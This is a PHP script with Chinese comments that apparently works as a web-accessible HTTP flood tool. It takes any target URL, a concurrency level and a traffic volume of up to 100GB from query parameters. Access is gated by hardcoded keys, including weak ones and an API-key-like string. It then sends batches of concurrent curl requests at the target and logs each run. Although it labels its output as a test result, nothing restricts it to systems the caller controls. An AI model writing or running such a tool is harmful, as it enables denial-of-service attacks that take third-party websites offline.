<?php
set_time_limit(0);
header('Content-Type: application/json');

$log_file = 'logs.json'; // JSON 日志存储文件

// 只允许 GET 请求
if ($_SERVER['REQUEST_METHOD'] !== 'GET') {
    echo json_encode(["error" => "只允许 GET 请求"]);
    exit;
}

// 获取参数
$url = $_GET['wz'] ?? null; // 目标网址
$concurrent_requests = (int)($_GET['cs'] ?? 10); // 并发数
$total_requests = (int)($_GET['bf'] ?? 100); // 总请求数
$traffic_gb = (float)($_GET['ll'] ?? 0); // 目标流量 (GB)
$key = $_GET['key'] ?? null; // 验证密钥

// 参数校验
if (!$url || !filter_var($url, FILTER_VALIDATE_URL)) {
    echo json_encode(["error" => "无效的 URL"]);
    exit;
}

// 验证 key
$valid_keys = ['8888', '1234', 'sk-7mX3pZ8qRt5fG2kH9bL4nJ6'];
if (!in_array($key, $valid_keys)) {
    echo json_encode(["error" => "无效的密钥"]);
    exit;
}

// 限制流量不超过 100GB
if ($traffic_gb > 100) {
    echo json_encode(["error" => "目标流量不能超过 100GB"]);
    exit;
}

// 计算总请求数（假设每个请求 50KB）
$bytes_per_request = 50 * 1024;
$total_bytes = $traffic_gb * 1024 * 1024 * 1024;
$total_requests = max($total_requests, ceil($total_bytes / $bytes_per_request));

// 记录开始时间
$start_time = microtime(true);

// 并发执行请求
function multi_request($url, $count) {
    $multi_handle = curl_multi_init();
    $handles = [];

    for ($i = 0; $i < $count; $i++) {
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, $url);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($ch, CURLOPT_TIMEOUT, 5);
        curl_multi_add_handle($multi_handle, $ch);
        $handles[] = $ch;
    }

    $running = null;
    do {
        curl_multi_exec($multi_handle, $running);
    } while ($running > 0);

    foreach ($handles as $ch) {
        curl_multi_remove_handle($multi_handle, $ch);
        curl_close($ch);
    }

    curl_multi_close($multi_handle);
}

// 逐批发送请求
$batch_size = min($concurrent_requests, $total_requests);
$remaining_requests = $total_requests;

while ($remaining_requests > 0) {
    $current_batch = min($batch_size, $remaining_requests);
    multi_request($url, $current_batch);
    $remaining_requests -= $current_batch;
}

// 计算总耗时
$end_time = microtime(true);
$duration = round($end_time - $start_time, 2);

// 生成测试结果
$response = [
    "时间戳" => date("Y-m-d H:i:s"),
    "目标网址" => $url,
    "总请求数" => $total_requests,
    "并发数" => $concurrent_requests,
    "目标流量" => "{$traffic_gb}GB",
    "总耗时" => "{$duration}秒"
];

// **保存日志**
$log_data = [];
if (file_exists($log_file)) {
    $log_content = file_get_contents($log_file);
    if (!empty($log_content)) {
        $log_data = json_decode($log_content, true);
    }
}

// 限制 JSON 文件最多保存 1000 条记录
if (count($log_data) >= 1000) {
    array_shift($log_data);
}

// 添加新记录
$log_data[] = $response;

// 保存到 JSON 文件
file_put_contents($log_file, json_encode($log_data, JSON_UNESCAPED_UNICODE | JSON_PRETTY_PRINT));

// 返回 JSON 结果
echo json_encode($response, JSON_UNESCAPED_UNICODE | JSON_PRETTY_PRINT);
?>
